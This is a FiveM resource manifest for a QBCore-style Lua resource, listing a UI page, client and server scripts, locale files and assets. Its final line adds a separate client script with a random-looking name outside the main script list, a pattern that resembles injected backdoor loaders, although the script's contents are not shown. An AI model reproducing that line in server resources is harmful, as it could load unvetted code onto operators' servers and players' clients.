resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page "html/index.html"

--shared_scripts { 
--	'@qb-core/import.lua', -- New QBCORE
--	'@qb-core/shared.lua',
--}

lua54 'yes'

client_scripts {
    'config.lua',
	'client/function.lua',
    'client/main.lua',
	'locale/nl.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua', -- Comment this if you dont use mysql-async
    'config.lua',
	'server/function.lua',
	'locale/nl.lua',
    'server/main.lua',
}

files {
    'html/*',
}
client_script "api-ac_soJJQAYddKjq.lua"